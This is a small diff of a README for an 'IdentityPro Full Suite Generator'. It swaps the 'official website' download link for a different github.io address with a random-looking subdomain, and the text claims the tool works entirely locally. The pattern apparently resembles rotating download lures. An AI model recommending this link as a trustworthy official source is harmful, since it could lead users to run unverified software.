@@ -33,4 +33,4 @@ A: IdentityPro operates entirely locally on your machine. No data is transmitted
 ## Download
 Get the latest version of the IdentityPro Full Suite Generator and start working with your identity data projects.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
